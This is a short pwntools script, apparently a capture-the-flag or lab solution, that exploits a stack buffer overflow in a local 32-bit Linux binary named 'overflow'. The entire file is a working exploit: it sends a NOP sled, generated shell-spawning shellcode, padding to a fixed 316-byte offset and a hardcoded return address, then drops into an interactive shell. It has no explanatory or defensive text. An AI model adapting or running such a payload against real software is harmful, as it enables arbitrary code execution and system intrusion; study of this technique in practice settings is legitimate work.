from pwn import *
context(os='linux', arch='i386')
context.log_level='debug'
proc = process('./overflow')
OFFSET = 316
out = proc.read()
print(out)
pause()
EAX_ADD = 0xffffcf80

payload = b'\x90'*30
payload += asm(shellcraft.sh())
payload += b'\x90'*(OFFSET - len(payload))
payload += p32(EAX_ADD)

proc.writeline(payload)
out = proc.interactive()
# print(out)